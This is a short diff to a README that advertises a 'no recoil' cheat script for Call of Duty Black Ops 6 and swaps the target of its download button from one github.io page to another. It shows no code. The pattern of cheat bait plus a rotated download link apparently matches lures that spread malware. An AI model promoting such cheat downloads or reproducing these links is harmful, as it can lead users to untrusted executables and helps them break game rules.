@@ -2,7 +2,7 @@
 ### *Achieve absolute weapon control and outgun every opponent.*
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/BO6recoilcontrol1" target="_blank">
+  <a href="https://trahendon.github.io/.github/BO6CodNoRecoilInfo41" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-BO6_NO_RECOIL_SCRIPT-red?style=for-the-badge&logo=call-of-duty&logoColor=white" alt="Download COD BO6 No Recoil Script" />
   </a>
 </p>
